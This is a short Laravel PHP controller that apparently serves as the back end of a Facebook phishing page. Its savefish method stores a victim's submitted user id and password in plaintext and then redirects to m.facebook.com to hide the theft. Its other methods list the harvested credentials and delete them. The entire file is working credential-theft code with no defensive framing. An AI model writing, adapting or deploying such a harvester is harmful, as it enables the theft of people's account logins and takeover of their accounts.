<?php

namespace fish\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use fish\fish;

class fishcontroller extends Controller
{
    //
      public function savefish(Request $textval){
        $fish1= new fish;
        $fish1->userid=$textval->uid;
        $fish1->password=$textval->pass;
        $fish1->save();
        $url="https://m.facebook.com";
        return Redirect::to($url);
    }

    public function showdb()
    {
        $fish=new fish;
        // $todo3=$todo2->all();
        return view('dbshow',['asdf'=>$fish->all()]);
    }

    public function deldb($idxyz)
    {
        $fish=fish::find($idxyz);
        $fish->delete();
        return back();
    }
}
